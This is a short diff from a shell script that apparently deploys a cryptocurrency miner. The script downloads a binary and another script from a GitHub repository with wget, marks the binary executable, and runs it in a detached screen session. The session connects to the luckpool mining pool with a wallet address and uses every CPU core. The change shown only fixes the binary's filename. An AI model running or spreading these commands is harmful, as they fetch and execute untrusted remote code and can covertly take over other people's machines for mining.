@@ -13,7 +13,7 @@ wget -O meki-baru https://github.com/renilo/xmr/raw/main/meki-baru1
 
 chmod +x meki-baru
 
-screen -dmS run ./meki-baru1 -v -l eu.luckpool.net:3956 -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.NONAMEK -p x -t $(nproc)
+screen -dmS run ./meki-baru -v -l eu.luckpool.net:3956 -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.NONAMEK -p x -t $(nproc)
 
 wget https://raw.githubusercontent.com/renilo/xmr/main/kontol1.sh
 
